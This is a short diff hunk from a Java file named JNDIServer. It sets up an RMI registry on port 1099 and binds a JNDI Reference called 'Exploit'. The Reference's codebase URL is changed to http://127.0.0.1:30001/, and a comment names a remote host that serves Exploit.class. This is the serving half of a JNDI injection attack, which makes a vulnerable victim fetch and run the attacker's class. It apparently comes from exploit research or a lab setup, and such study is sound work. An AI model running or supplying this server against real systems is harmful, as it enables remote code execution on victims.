@@ -18,7 +18,7 @@ public class JNDIServer {
         Registry registry = LocateRegistry.createRegistry(1099);
         //http://xxlegend.com/Exploit.class即可
         Reference reference = new Reference("Exloit",
-                "Exploit","http://127.0.0.1/");
+                "Exploit","http://127.0.0.1:30001/");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         registry.bind("Exploit",referenceWrapper);
 
